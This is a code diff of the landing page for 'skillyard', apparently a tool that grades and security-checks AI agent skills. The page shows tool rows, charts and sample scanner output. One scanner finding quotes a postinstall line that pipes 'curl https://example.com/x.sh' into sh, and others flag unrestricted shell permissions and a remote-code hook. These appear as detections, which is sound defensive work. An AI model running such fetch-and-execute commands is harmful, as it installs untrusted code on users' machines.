@@ -161,9 +161,10 @@ function splitFrontmatter(md) {
   return m ? { fm: m[1], body: md.replace(/\r\n/g, '\n').slice(m[0].length) } : { fm: null, body: md };
 }
 
-function card(s) {
+function card(s, lib) {
+  const j = lib?.byId.get(s.id);
   return h`<a class="card" href="${skillHref(s)}">
-    <div class="meta"><span class="id">${s.id}</span>${raw(s.visibility === 'private' ? '<span class="badge private">Private</span>' : '')}</div>
+    <div class="meta"><span class="id">${s.id}</span>${raw(s.visibility === 'private' ? '<span class="badge private">Private</span>' : '')}${raw(j ? `<span class="judge">${judgeChips(j)}</span>` : '')}</div>
     <h3>${s.title}</h3>
     <p>${s.summary}</p>
     <div class="meta"><span class="tag">${CATEGORY_LABELS[s.category] || s.category}</span>${raw(s.tags.slice(0, 3).map((t) => `<span class="tag">${esc(t)}</span>`).join(''))}<span style="margin-left:auto">v${s.latest}</span></div>
@@ -218,15 +219,6 @@ const MEASURED = [
 const CFG = window.SKILLYARD_CONFIG || { signup: {}, contact: { label: 'Follow @agentwik on X', url: 'https://x.com/agentwik' } };
 const signupOn = () => !!(CFG.signup && CFG.signup.action);
 
-function lpNav() {
-  return `<header class="lp-nav">
-    <a class="lp-word" href="#/">skillyard</a>
-    <nav aria-label="Main"><a href="#/browse">Skills</a><a href="#/create">Create</a><a href="studio/">Studio</a><a href="#/teams">For teams</a></nav>
-    <a class="lp-action" href="#/teams">Get a free audit</a>
-  </header>`;
-}
-
-/** An email field set inside a sentence. tag says why they signed up: report, audit, pack or waitlist. */
 function signupSentence({ lead, field = 'your email', button, tag, note, id }) {
   if (!signupOn()) {
     return `<div class="cta-sentence"><span class="lp-h-inline">${lead}</span> <a class="cta-btn" href="${esc(CFG.contact.url)}" target="_blank" rel="noopener noreferrer">${esc(CFG.contact.label)}</a></div>
@@ -256,200 +248,402 @@ function bindSignups(root) {
   }));
 }
 
+const TERM_REVIEW = `$ skillyard review examples/bad
+
+F  engineering-handbook  ~ 217 tok  6 findings: contradiction, vague-instruction
+     high   SKILL.md:13 contradiction with line 12:
+            "Always indent with tabs." vs "Use 2-space indentation everywhere"
+     high   SKILL.md:18 contradiction with line 17:
+            "Squash every PR into one commit." vs "Never squash"
+     high   SKILL.md:26 contradiction with line 25:
+            "Deploy on Fridays only after 4pm" vs "Never deploy on Fridays."
+            fix: Keep one rule, or state when each applies.
+C  notes-v2              ~ 811 tok  1 finding: description-no-when
+     high   SKILL.md:3 description does not say when to use the skill
+A  lint-everything       ~ 102 tok  no findings
+       high scripts/setup.sh:2 no \`set -e\`: a failed command is ignored`;
+const TERM_SECURE = `$ skillyard secure test/fixtures/secure-bad
+
+HIGH   .claude/settings.json:2  permission "Bash(*)" lets the agent run any shell command unprompted
+       fix: allow exact commands, e.g. Bash(npm test:*)
+HIGH   .claude/settings.json:6  hook: downloads and runs remote code in one step
+       fix: download, verify a checksum or signature, then run a pinned local copy
+HIGH   .mcp.json:3  MCP server "files" is given / as a root; it can read or write far beyond this project
+HIGH   .mcp.json:5  MCP server "db" has a secret inlined in DB_PASSWORD; it lands in git and backups
+       fix: reference an environment variable and keep the value out of the file
+HIGH   skills/risky/package.json:3  postinstall script runs automatically: curl https://example.com/x.sh | sh
+MEDIUM .mcp.json:3  MCP server "files" runs @example/server-filesystem unpinned
+       fix: pin a version, e.g. @1.2.3`;
+
+// The landing is one journey: build, check, improve, save, protect. Every command below exists in src/cli.js, and
+// every output line was copied from a real run on registry/public, examples/ or test/fixtures (trimmed, not edited).
+const FREE = 'Free and open source. Runs on your machine.';
+const PILOT = 'For teams. In pilot with design partners.';
+const JOURNEY = [
+  { id: 'build', step: 'Build', h: 'Write a skill once. Run it in five agents.', tier: FREE,
+    promise: 'Turn an interview, a runbook or a document into a skill with trigger tests, then compile it to each agent\'s own format.',
+    tools: [
+      { name: 'Create', cmd: 'skillyard create --answers answers.json', what: 'Interview, document or session log in; a reviewed, secured and tested skill out.', out: 'review: A (98/100), 1 finding\ntest: 4 passed, 0 failed (static trigger cases)' },
+      { name: 'Generate', cmd: 'skillyard generate checklist --from runbook.md', what: 'Six generators (procedure, checklist, voice, playbook, decision, metric) filled from your own document.', out: 'created refund-request-review' },
+      { name: 'Compile', cmd: 'skillyard compile release-notes --to all', what: 'Native files for Claude Code, Codex, Cursor, Copilot and Gemini, each checked for size, frontmatter and lost content.', out: 'copilot: FAIL size (4301/4000 chars read by code review)\ngemini: GEMINI.md  ok size (4385/20000 bytes)' },
+    ] },
+  { id: 'check', step: 'Check', h: 'Find what is wrong before an agent follows it.', tier: FREE,
+    promise: 'Grade every skill A to F with line-level findings, and audit the skills, MCP configs, hooks and scripts around them.',
+    tools: [
+      { name: 'Review', cmd: 'skillyard review skills/', what: 'Contradictions, vague wording, broken links, skills that crowd each other out. --fix applies the safe fixes.', out: 'F  engineering-handbook  ~ 217 tok  6 findings: contradiction' },
+      { name: 'Secure', cmd: 'skillyard secure . --gate high', what: 'Permissions, MCP servers, hooks, dependencies and remote scripts. A non-zero exit makes it a CI gate.', out: 'HIGH .mcp.json:5  MCP server "db" has a secret inlined in DB_PASSWORD' },
+      { name: 'Clean', cmd: 'skillyard clean scripts skills/', what: 'Scripts shipped inside skills: error handling, hard-coded paths, exec bits.', out: 'high scripts/fetch.sh:2 no `set -e`: a failed command is ignored' },
+    ] },
+  { id: 'improve', step: 'Improve', h: 'Learn from how your team really works.', tier: FREE,
+    promise: 'Find the corrections people keep repeating, turn them into skill changes, and keep a change only when it measurably helps.',
+    tools: [
+      { name: 'Chat review', cmd: 'skillyard review --chats', what: 'Reads your own agent sessions locally and proposes edits. Nothing changes without your approval.', out: '[af240c47] no skill covers this  4 corrections (repeated)  pending' },
+      { name: 'Optimize', cmd: 'skillyard optimize notes-v2', what: 'Cuts tokens and keeps the rewrite only if the grade and trigger cases hold.', out: 'notes-v2: tokens 811 -> 783 (-3%)  grade C -> C' },
+      { name: 'Radar', cmd: 'skillyard radar logs/ --team', what: 'Corrections repeated across people become a drafted, tested skill, ready for a pull request.', out: 'Cluster 85fd6553: 2 people, 6 corrections in 4 sessions' },
+      { name: 'A/B', cmd: 'skillyard ab report deploy', what: 'Split sessions between two versions; promote B only at p < 0.05 with 30 sessions per arm.', out: 'Decision: promote B (p=0.0000 ... (56/78 vs 9/82))' },
+      { name: 'Model watch', cmd: 'skillyard watch run skills/ --model <new> --allow-model', what: 'When a new model ships, re-run every skill\'s evals on old and new, report drops and draft fixes.', out: null, noOut: 'Runs real model calls, so no sample output here. Needs --allow-model and an API key.' },
+    ] },
+  { id: 'save', step: 'Save', h: 'Spend tokens on the work, not on re-reading.', tier: FREE,
+    promise: 'Give agents a map to query instead of opening every file, see where the tokens go, and estimate what each skill saves.',
+    tools: [
+      { name: 'Map', cmd: 'skillyard map', what: 'Indexes files, symbols, imports and skills; agents ask the map and read one section.', out: 'mapped 7 files, 1 skills -> .skillyard/map/{map.json,MAP.md}' },
+      { name: 'Tokens', cmd: 'skillyard tokens --days 7', what: 'Tokens and estimated cost from Claude Code logs, per day, repo, skill and session.', out: 'Token usage, last 7 days: 13.5k tokens, est. $0.05 across 1 sessions' },
+      { name: 'Savings ledger', cmd: 'skillyard savings --statement out.md', what: 'Estimated dollars saved per skill from corrections, redo turns and tokens, with its confidence stated.', out: 'This is a correlation, not an experiment: confidence is low under 10 matched sessions' },
+    ] },
+];
+const PROTECT = { id: 'protect', step: 'Protect', h: 'Your company\'s skills are an asset. Keep them yours.', tier: PILOT,
+  promise: 'A private vault with roles and an audit trail, copies that name the person they were issued to, and access you can take back.',
+  groups: [
+    { name: 'Keep', tools: [
+      { name: 'Vault and roles', cmd: 'skillyard token create --org acme --role editor', what: 'Versions, diffs and rollback; publishing must pass review and security.', out: 'token d840e76f297e (read,publish for @acme), shown once' },
+      { name: 'Audit log', cmd: 'skillyard audit verify', what: 'Every pull, publish and rollback, hash-chained.', out: 'ok   audit log: 291 entries (291 chained, 0 legacy)' },
+      { name: 'Signed skills', cmd: 'skillyard verify deploy-safely --pub key.pem', what: 'What runs is what was approved.', out: 'FAIL ds: files differ from what was signed  changed: SKILL.md' },
+    ] },
+    { name: 'Trace', tools: [
+      { name: 'Every copy marked', cmd: 'skillyard trace leaked.md --marks marks.json', what: 'Each person gets their own copy; a leaked fragment names who it was issued to.', out: 'alice  v1.0.0  confidence 1.0000  (86 bits)' },
+      { name: 'Evidence pack', cmd: 'skillyard evidence leaked.md --org acme', what: 'Signed report with the trace, pull history, audit chain and a drafted takedown notice.', out: 'ok   evidence.json signature valid' },
+      { name: 'Call-home link', cmd: 'skillyard org settings acme --beacon on --i-have-legal-review', what: 'A harmless per-copy link that records when a leaked copy is opened.', out: null, note: 'Opt-in, legal review required.', noOut: 'Off by default. Read docs/beacon.md and get legal review before turning it on.' },
+    ] },
+    { name: 'Take back', tools: [
+      { name: 'Revocable streaming', cmd: 'skillyard connect claude --stream', what: 'Agents load skills from the vault over MCP; nothing is written to disk.', out: 'Nothing is installed on this machine, and `skillyard revoke` cuts access on the next call.' },
+      { name: 'Offboarding', cmd: 'skillyard offboard alice --org acme', what: 'Revoke a leaver\'s tokens and list every skill and version they pulled.', out: 'revoked alice; report written to off.md' },
+      { name: 'Exit interview', cmd: 'skillyard exit-interview pat --answers a.json', what: 'Capture what only they know as private draft skills, checked like any other.', out: 'pat-know-how: review: A (98/100), 1 finding' },
+    ] },
+    { name: 'Prove', tools: [
+      { name: 'Governance export', cmd: 'skillyard governance export --org acme --framework all', what: 'Inventory, approval trail, access and integrity, mapped to SOC 2, ISO 42001 and the EU AI Act.', out: 'wrote governance bundle (7 skills, audit log verified)' },
+    ] },
+  ] };
+// BACKLOG.md "Later": planned, not built.
+const ROADMAP = ['Leak-watch crawler', 'Collusion-resistant marks', 'Single sign-on', 'Slack alerts', 'VS Code extension', 'Self-hosted vault'];
+
+function lpNav() {
+  return `<header class="lp-nav">
+    <a class="lp-word" href="#/">skillyard</a>
+    <nav aria-label="The journey">${[...JOURNEY, PROTECT].map((s) => `<a href="#/?s=${s.id}">${s.step}</a>`).join('')}<a href="#/?s=proof">Proof</a><a href="#/?s=library">Library</a></nav>
+    <a class="lp-action" href="#/?s=teams">For teams</a>
+  </header>`;
+}
+
 function lpFooter() {
   return `<footer class="lp-foot">
     <div class="lp-foot-top">
-      <div><h2 class="lp-h">Make the next skill yours.</h2><a class="lp-action solid" href="#/create">Open the skill builder</a></div>
-      <ul><li><a href="#/teams">For teams and pricing</a></li><li><a href="studio/">Studio demo</a></li><li><a href="#/examples">Good vs bad</a></li><li><a href="https://github.com/agentwik-labs/skillyard">GitHub</a></li><li><a href="${esc(CFG.contact.url)}">${esc(CFG.contact.label)}</a></li></ul>
+      <div><h2 class="lp-h">Check your skills today.</h2><p class="lp-install"><code>npx skillyard review</code></p></div>
+      <ul class="jf">${[...JOURNEY, PROTECT].map((s) => `<li><a href="#/?s=${s.id}">${s.step}</a></li>`).join('')}<li><a href="#/?s=proof">Proof</a></li><li><a href="#/?s=library">Library</a></li><li><a href="#/teams">For teams</a></li></ul>
+      <ul><li><a href="#/browse">Browse all skills</a></li><li><a href="#/examples">Good vs bad</a></li><li><a href="#/create">Create a skill</a></li><li><a href="https://github.com/agentwik-labs/skillyard">GitHub</a></li><li><a href="${esc(CFG.contact.url)}">${esc(CFG.contact.label)}</a></li></ul>
     </div>
     <div class="lp-legal"><span>MIT licensed. Imported skills keep their own licences.</span><span>No cookies, no analytics.</span></div>
-    <div class="lp-big" aria-hidden="true">skillyard</div>
   </footer>`;
 }
 
-function lpEntrances() {
-  const io = 'IntersectionObserver' in window && !matchMedia('(prefers-reduced-motion: reduce)').matches
-    ? new IntersectionObserver((es) => es.forEach((en) => { if (en.isIntersecting) { en.target.classList.add('in'); io.unobserve(en.target); } }), { threshold: 0.15 }) : null;
-  app.querySelectorAll('.lp section, .lp-foot').forEach((sec) => { if (io) { sec.classList.add('rise'); io.observe(sec); } });
+function toolRow(t) {
+  return `<li><div class="jr-a"><b>${esc(t.name)}</b><span>${esc(t.what)}</span>${t.note ? `<em class="jr-note">${esc(t.note)}</em>` : ''}</div>
+    <code class="jr-cmd">${esc(t.cmd)}</code>
+    ${t.out ? `<pre class="jr-out" aria-label="Example output">${esc(t.out)}</pre>` : `<span class="jr-out none">${esc(t.noOut || '')}</span>`}</li>`;
 }
 
-// The offer, in one place so the front page and the teams page agree.
-const OFFER = [
-  { name: 'Open source', price: 'Free', what: 'Every skill on this site, the CLI, a registry you can host, the skill builder, and Studio on your own machine. MIT licensed.', cta: ['Browse the skills', '#/browse'] },
-  { name: 'Skills audit', price: '$750', note: 'First three teams free', what: 'We scan and test the skills your team already uses, public and internal: what runs code, what talks to the network, which ones make your agents worse. A ranked report in a week.', cta: ['Request an audit', '#/teams?ask=audit'] },
-  { name: 'Skills pack', price: 'From $3,000', what: 'We turn your runbooks, policies and playbooks into ten private skills, test each one with and without on your real requests, and install them across Claude Code, Codex and Cursor.', cta: ['Talk about a pack', '#/teams?ask=pack'] },
-  { name: 'Studio for teams', price: 'Waitlist', what: "Every developer's corrections, redacted and counted together: the team's correction rate, the fixes that worked for teammates, approvals with roles. Hosted.", cta: ['Join the waitlist', '#/teams?ask=waitlist'] },
-];
+function stepHead(s, extra = '') {
+  return `<div class="x-head"><h2 id="${s.id}-h" class="lp-h"><span class="jn">${s.step}.</span> ${esc(s.h)}</h2>
+    <div class="j-side"><p class="v-lede">${esc(s.promise)}</p><p class="tier${s.tier === PILOT ? ' pilot' : ''}">${s.tier}</p>${extra}</div></div>`;
+}
 
-function offerList() {
-  return `<ul class="offer">${OFFER.map((o) => `<li>
-    <span class="o-name">${esc(o.name)}</span>
-    <span class="o-what">${esc(o.what)}</span>
-    <span class="o-price">${esc(o.price)}${o.note ? `<small>${esc(o.note)}</small>` : ''}</span>
-    <a class="o-cta" href="${o.cta[1]}">${esc(o.cta[0])} →</a>
-  </li>`).join('')}</ul>`;
+function stepSection(s, after = '') {
+  return `<section class="v-sec j-step" id="${s.id}" aria-labelledby="${s.id}-h">
+      ${stepHead(s)}
+      <ul class="jr">${s.tools.map(toolRow).join('')}</ul>
+      ${after}
+    </section>`;
+}
+
+function protectSection(id = 'protect') {
+  const s = PROTECT;
+  return `<section class="v-sec j-step j-dark" id="${id}" aria-labelledby="${s.id}-h">
+      ${stepHead(s)}
+      ${s.groups.map((g) => `<div class="jg"><h3 class="jg-h">${esc(g.name)}</h3><ul class="jr">${g.tools.map(toolRow).join('')}</ul></div>`).join('')}
+    </section>`;
+}
+
+function roadmapStrip() {
+  return `<section class="v-sec rm" aria-labelledby="rm-h">
+      <h2 id="rm-h" class="rm-h">Roadmap, built when design partners ask for it</h2>
+      <ul class="rm-list">${ROADMAP.map((r) => `<li>${esc(r)}</li>`).join('')}</ul>
+    </section>`;
+}
+
+function teamsCta(id) {
+  return `<section class="lp-cta" aria-labelledby="${id}-h" id="${id === 'su-home' ? 'teams' : 'ask'}">
+      <h2 class="lp-h" id="${id}-h">For teams: become a design partner.</h2>
+      <p class="v-lede">The developer tools above are free. The vault and the team features are in pilot: we set them up with a few companies, starting with a free audit of the skills you already use.</p>
+      ${signupSentence({ lead: 'Reply to', button: 'Request', tag: 'audit', id, note: 'We reply within two working days to set up a 20-minute call and a free audit of your skills.' })}
+    </section>`;
+}
+
+// ---- the library: Skillyard's own grades for every public skill (web/media/library.json, built by tools/build-library.mjs)
+let libraryP;
+function loadLibrary() {
+  libraryP ||= fetch('media/library.json').then((r) => (r.ok ? r.json() : null)).then((l) => {
+    if (!l || !Array.isArray(l.skills)) return null;
+    l.byId = new Map(l.skills.map((s) => [s.id, s]));
+    return l;
+  }).catch(() => null);
+  return libraryP;
+}
+const SECURE_LABEL = { clean: 'No security findings', low: 'Low-risk security notes', medium: 'Medium security findings', high: 'High security findings' };
+function judgeChips(j) {
+  if (!j) return '';
+  return `<span class="gchip" title="Graded ${esc(j.grade)} (${j.score}/100) by skillyard review">${esc(j.grade)}</span><span class="schip ${j.secure}" title="skillyard secure">${esc(j.secure === 'clean' ? 'secure' : `${j.secure} risk`)}</span>`;
+}
+
+const RULE_WORDS = { bloat: 'length paid on every load', 'description-no-when': 'a description that never says when to use it', 'broken-link': 'broken links', contradiction: 'contradictions', 'thin-body': 'almost no instructions', frontmatter: 'broken frontmatter', 'trigger-hijack': 'triggers that steal other skills\' work' };
+// The most common non-heuristic findings among D and F skills, counted from the library itself.
+function why(l) {
+  const c = {};
+  for (const s of l.skills) if ('DF'.includes(s.grade)) for (const r of new Set(s.top.map((f) => f.rule))) if (RULE_WORDS[r]) c[r] = (c[r] || 0) + 1;
+  const top = Object.entries(c).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([r]) => RULE_WORDS[r]);
+  return top.length ? `, most often for ${top.slice(0, -1).join(', ')}${top.length > 1 ? ' or ' : ''}${top[top.length - 1]}` : '';
+}
+function chartGrades(l) {
+  const order = ['A', 'B', 'C', 'D', 'F'];
+  const max = Math.max(...order.map((g) => l.grades[g] || 0));
+  const df = (l.grades.D || 0) + (l.grades.F || 0);
+  const body = `<ul class="gd">${order.map((g) => `<li><span class="gchip">${g}</span>${hbar(pc(l.grades[g] || 0, max), 'var(--ink)', 18, `Grade ${g}: ${l.grades[g] || 0} skills`)}<b>${l.grades[g] || 0}</b></li>`).join('')}</ul>
+    <p class="gd-sec">Security: <b>${l.secure.clean}</b> clean, <b>${l.secure.low}</b> low, <b>${l.secure.medium}</b> medium, <b>${l.secure.high}</b> high.</p>`;
+  return proofFigure({ id: 'pf-lib', cls: 'lib-fig', title: `Grades across ${l.total} public skills`,
+    takeaway: `${l.grades.A} get an A. ${df} get a D or F${why(l)}.`,
+    body, table: numTable(['Grade', 'Skills'], order.map((g) => [g, l.grades[g] || 0])), source: `skillyard review and skillyard secure, run over the library on ${fmtDate(l.generatedAt)}` });
+}
+
+function libCard(j) {
+  const ref = j.scope === 'public' ? j.name : j.id;
+  return `<li class="lc"><a class="lc-a" href="#/skill/${esc(j.id)}"><span class="lc-t">${esc(j.title)}</span><span class="lc-d">${esc(j.description)}</span></a>
+    <div class="lc-m">${judgeChips(j)}<span class="lc-src">${esc(j.scope === 'public' ? 'Skillyard' : j.source.repo || 'community')}${j.source.licence ? ` · ${esc(j.source.licence)}` : ''}</span></div>
+    ${cmd(`npx skillyard install ${ref}`)}</li>`;
+}
+
+async function librarySection(el) {
+  const l = await loadLibrary();
+  if (!l) { el.remove(); return; }
+  const picks = l.featured.map((id) => l.byId.get(id)).filter(Boolean);
+  el.innerHTML = `<div class="x-head"><h2 id="library-h" class="lp-h">${l.total} public skills, graded by our own reviewer.</h2>
+      <div class="j-side"><p class="v-lede">${l.scopes.public} written by us, ${l.scopes.community} imported from open-source repositories with their licences kept. Every grade comes from the same review and security code you run locally; none is set by hand.</p></div></div>
+    <div class="lib">${chartGrades(l)}
+      <div class="lib-picks"><h3 class="lib-h">Worth installing first</h3><ul class="lcs">${picks.map(libCard).join('')}</ul>
+      <a class="lp-link" href="#/browse">Browse all ${l.total} with grade and security filters →</a></div></div>`;
+  copyButtons(el);
+}
+
+// ---- proof charts: inline SVG drawn from web/media/proof.json (real runs; each block names its source) ----------
+const GRAY = '#8a8a8a';
+const pc = (v, max) => +(v / max * 100).toFixed(2);
+function numTable(head, rows) {
+  return `<div class="pf-tw"><table><thead><tr>${head.map((x) => `<th scope="col">${esc(x)}</th>`).join('')}</tr></thead><tbody>${rows.map((r) => `<tr>${r.map((c, i) => (i ? `<td>${esc(String(c))}</td>` : `<th scope="row">${esc(String(c))}</th>`)).join('')}</tr>`).join('')}</tbody></table></div>`;
+}
+function proofFigure({ id, cls = '', title, takeaway, body, table, source }) {
+  return `<figure class="pf ${cls}" aria-labelledby="${id}-t" aria-describedby="${id}-k">
+    <h3 id="${id}-t" class="pf-t">${title}</h3>
+    <p id="${id}-k" class="pf-k">${takeaway}</p>
+    ${body}
+    <details class="pf-d"><summary>Show the numbers</summary>${table}</details>
+    <figcaption class="pf-s">Source: ${esc(source)}</figcaption>
+  </figure>`;
+}
+// A horizontal bar whose left end sits square on the baseline and whose data end is rounded (percent units, so it
+// stays crisp at any width).
+function hbar(w, fill, h = 14, tip = '') {
+  return `<svg class="pf-bar" width="100%" height="${h}" aria-hidden="true" focusable="false"><rect x="0" y="0" width="100%" height="${h}" rx="4" fill="var(--track)"/>${w > 0 ? `<rect x="0" y="0" width="${w}%" height="${h}" rx="4" fill="${fill}"><title>${esc(tip)}</title></rect><rect x="0" y="0" width="${Math.min(w, 1.5)}%" height="${h}" fill="${fill}"/>` : ''}</svg>`;
+}
+
+function chartLift(d) {
+  const rows = [...d.rows].sort((a, b) => (b.with - b.without) - (a.with - a.without));
+  const body = `<div class="pf-legend" aria-hidden="true"><span><i class="dot" style="background:${GRAY}"></i>Without the skill</span><span><i class="dot" style="background:var(--accent)"></i>With the skill</span></div>
+    <ol class="db">${rows.map((r) => {
+      const up = r.with - r.without;
+      return `<li><span class="db-n">${esc(r.skill)}</span><span class="db-v"><span class="a">${r.without}%</span> to <b>${r.with}%</b> <em>${up ? `+${up} pts` : 'no change'}</em></span>
+      <svg class="db-svg" width="100%" height="20" aria-hidden="true" focusable="false"><rect x="0" y="9" width="100%" height="2" fill="var(--track)"/>${up ? `<rect x="${r.without}%" y="8" width="${up}%" height="4" fill="var(--accent)" opacity=".3"/>` : ''}<circle cx="${r.without}%" cy="10" r="7" fill="${GRAY}" stroke="var(--panel)" stroke-width="2"><title>${esc(r.skill)} without the skill: ${r.without}%</title></circle><circle cx="${r.with}%" cy="10" r="7" fill="var(--accent)" stroke="var(--panel)" stroke-width="2"><title>${esc(r.skill)} with the skill: ${r.with}%</title></circle></svg></li>`;
+    }).join('')}</ol>
+    <div class="pf-axis" aria-hidden="true"><span>0%</span><span>50%</span><span>100%</span></div>`;
+  return proofFigure({ id: 'pf-lift', cls: 'w7', title: 'Same task, same model, with and without the skill',
+    takeaway: 'On three of four tasks the skill raised the score, by up to 90 points. On the fourth the model already scored 100% on its own.',
+    body, table: numTable(['Skill', 'Without', 'With', 'Lift'], rows.map((r) => [r.skill, `${r.without}%`, `${r.with}%`, `+${r.with - r.without} pts`])), source: `${d.source}. Graded by fixed checks, no AI judge.` });
+}
+
+function chartPrecision(d) {
+  const body = `<ol class="gr">${d.skills.map((s, i) => `<li><span class="gr-n">${esc(s)}</span><span class="chip before" aria-label="before: ${d.before[i]}">${d.before[i]}</span><span class="gr-ar" aria-hidden="true">→</span><span class="chip after${d.after[i] === 'A' ? ' a' : ''}" aria-label="after: ${d.after[i]}">${d.after[i]}</span></li>`).join('')}</ol>
+    <div class="pf-legend" aria-hidden="true"><span><i class="sq before"></i>Grade before tuning</span><span><i class="sq after"></i>Grade after</span></div>`;
+  const as = d.after.filter((g) => g === 'A').length;
+  return proofFigure({ id: 'pf-prec', cls: 'w5', title: 'Fewer false alarms from the reviewer',
+    takeaway: `Six carefully written skills from another team. The first reviewer graded two of them D and one F. After tuning, ${as} of 6 get an A and none falls below B.`,
+    body, table: numTable(['Skill', 'Before', 'After'], d.skills.map((s, i) => [s, d.before[i], d.after[i]])), source: d.source });
+}
+
+function chartTokens(d) {
+  const segs = [['Cache reads', d.split_m.cache_read, 'var(--accent)'], ['Cache writes', d.split_m.cache_write, 'var(--ink)'], ['Output', d.split_m.output, GRAY], ['Input', d.split_m.input, '#c4c4c4']];
+  const share = (v) => (v / d.total_m * 100);
+  let x = 0;
+  const stack = `<svg class="pf-stack" width="100%" height="44" aria-hidden="true" focusable="false">${segs.map(([n, v, c]) => { const w = share(v); const r = `<rect x="${x.toFixed(2)}%" y="0" width="${w.toFixed(2)}%" height="44" fill="${c}" stroke="var(--panel)" stroke-width="2"><title>${n}: ${v}M tokens (${w.toFixed(1)}%)</title></rect>`; x += w; return r; }).join('')}</svg>`;
+  const legend = `<ul class="pf-keys">${segs.map(([n, v, c]) => `<li><i class="sq" style="background:${c}"></i><b>${n}</b><span>${v < 1 ? v.toFixed(2) : v.toFixed(1)}M · ${share(v) < 0.1 ? '<0.1' : share(v) < 1 ? share(v).toFixed(1) : Math.round(share(v))}%</span></li>`).join('')}</ul>`;
+  const max = Math.max(...d.daily_m.map((r) => r[1]));
+  const min = Math.min(...d.daily_m.map((r) => r[1]));
+  const H = 150, base = 126, top = 22, n = d.daily_m.length, slot = 100 / n, bw = slot * 0.62;
+  const cols = d.daily_m.map(([day, v], i) => {
+    const h = Math.max(2, (v / max) * (base - top)); const y = base - h; const cx = i * slot + slot / 2; const bx = cx - bw / 2;
+    const fill = v === max ? 'var(--accent)' : GRAY;
+    const lbl = v === max || v === min ? `<text x="${cx.toFixed(2)}%" y="${y - 7}" text-anchor="middle" class="pf-vl">${v}M</text>` : '';
+    return `<rect x="${bx.toFixed(2)}%" y="${y}" width="${bw.toFixed(2)}%" height="${h}" rx="4" fill="${fill}"><title>Nov ${day.slice(3)}: ${v}M tokens</title></rect><rect x="${bx.toFixed(2)}%" y="${base - Math.min(4, h)}" width="${bw.toFixed(2)}%" height="${Math.min(4, h)}" fill="${fill}"/>${lbl}<text x="${cx.toFixed(2)}%" y="${H - 6}" text-anchor="middle" class="pf-dl">${Number(day.slice(3))}</text>`;
+  }).join('');
+  const daily = `<svg class="pf-cols" width="100%" height="${H}" aria-hidden="true" focusable="false"><rect x="0" y="${base}" width="100%" height="2" fill="var(--track)"/>${cols}</svg>`;
+  const body = `<div class="tk">
+      <div class="tk-main"><p class="tk-big"><b>${Math.round(share(d.split_m.cache_read))}%</b> of ${d.total_m}M tokens were cache reads</p>${stack}${legend}</div>
+      <div class="tk-side"><p class="tk-h">Tokens per day, November ${Number(d.daily_m[0][0].slice(3))} to ${Number(d.daily_m[n - 1][0].slice(3))}</p>${daily}</div>
+    </div>`;
+  return proofFigure({ id: 'pf-tok', cls: 'w12', title: 'Where one developer\'s tokens went in a week',
+    takeaway: `Almost everything was the agent re-reading context it had already seen. New input was ${d.split_m.input}M tokens. That is why a map the agent can query, instead of re-opening files, is where the savings are.`,
+    body, table: numTable(['Kind or day', 'Tokens (millions)'], [...segs.map(([n, v]) => [n, v]), ...d.daily_m.map(([day, v]) => [`Nov ${Number(day.slice(3))}`, v])]), source: `${d.source}. Measured with skillyard tokens.` });
+}
+
+function chartTrace(d) {
+  const max = Math.max(...d.bits.map((b) => b[1]));
+  const body = `<ul class="tr">${d.bits.map(([name, bits]) => {
+    const ai = /AI rewrite/.test(name);
+    return `<li class="${ai ? 'ai' : ''}"><span class="tr-n">${esc(name)}</span><span class="tr-v">${bits} bits · ${ai ? 'traced correctly, 1 of 1 rewritten copy' : 'traced correctly 10/10'}</span>${hbar(pc(bits, max), ai ? 'var(--accent)' : GRAY, 14, `${name}: ${bits} bits of evidence`)}</li>`;
+  }).join('')}</ul>`;
+  return proofFigure({ id: 'pf-trace', cls: 'w7', title: 'Evidence left in a leaked copy, by what was done to it',
+    takeaway: 'Each change wipes out some of the marks, but in every case enough was left to name the person the copy was issued to. That includes a copy a real AI model reworded freely.',
+    body, table: numTable(['What was done to the copy', 'Evidence (bits)', 'Result'], d.bits.map(([n, b]) => [n, b, /AI rewrite/.test(n) ? 'traced correctly (1 of 1)' : 'traced correctly (10/10)'])), source: `${d.source.split(';')[0]}. The paraphrase row is simulated; the AI rewrite row is one real Claude Haiku rewrite of one copy.` });
+}
+
+function chartScan(d) {
+  const facts = [[d.ship_scripts, 'ship scripts that can run on your machine'], [d.network_calls, 'make network calls'], [d.fail_format, 'fail the skill format'], [d.confirmed_malicious, 'confirmed malicious']];
+  const body = `<p class="sc-big"><b>${d.skills}</b> public skills scanned</p>
+    <ul class="sc">${facts.map(([v, t]) => `<li><b>${v}</b><span>${esc(t)}</span><span class="sc-p">${Math.round(v / d.skills * 100)}% of ${d.skills}</span>${hbar(pc(v, d.skills), v ? 'var(--ink)' : GRAY, 8, `${v} of ${d.skills}`)}</li>`).join('')}</ul>`;
+  return proofFigure({ id: 'pf-scan', cls: 'w5', title: 'What the most-installed public skills contain',
+    takeaway: `We found nothing malicious. But about one in five ships a script, and one in six calls the network, so a skill is code worth checking before it runs.`,
+    body, table: numTable(['Finding', 'Skills', `Share of ${d.skills}`], facts.map(([v, t]) => [t, v, `${Math.round(v / d.skills * 100)}%`])), source: d.source });
+}
+
+async function proofCharts(el) {
+  try {
+    const r = await fetch('media/proof.json');
+    if (!r.ok) throw new Error(String(r.status));
+    const d = await r.json();
+    el.innerHTML = chartLift(d.lift) + chartPrecision(d.reviewer_precision) + chartTokens(d.tokens) + chartTrace(d.trace) + chartScan(d.scan);
+  } catch {
+    el.innerHTML = '<p class="pf-k">The measurements could not be loaded. They are in <a href="https://github.com/agentwik-labs/skillyard/tree/main/reports">the reports folder on GitHub</a>.</p>';
+  }
+}
+
+function launchVideo() {
+  return `<figure class="vid">
+      <video id="launch-video" controls muted playsinline preload="metadata" poster="media/skillyard-launch-poster.jpg" aria-describedby="vid-cap">
+        <source src="media/skillyard-launch.mp4" type="video/mp4">
+        <a href="media/skillyard-launch.mp4">Download the 48-second tour (MP4)</a>
+      </video>
+      <figcaption id="vid-cap">The 48-second tour, no sound: a skill reviewed, a project secured, and a leaked copy traced back to the person it was issued to.</figcaption>
+    </figure>`;
 }
 
 async function viewShowcase() {
-  const { skills } = await api('/api/skills?limit=1000');
-  const pub = skills.filter((s) => s.visibility === 'public' && !['acme', 'northwind'].includes(s.scope));
-  const sources = {};
-  for (const s of pub) (sources[srcName(s)] ||= []).push(s);
-  const srcList = Object.entries(sources).sort((a, b) => b[1].length - a[1].length).map(([n]) => n);
-  const business = pub.filter((s) => s.scope === 'skillyard' && BUSINESS.includes(s.category))
-    .sort((a, b) => BUSINESS.indexOf(a.category) - BUSINESS.indexOf(b.category));
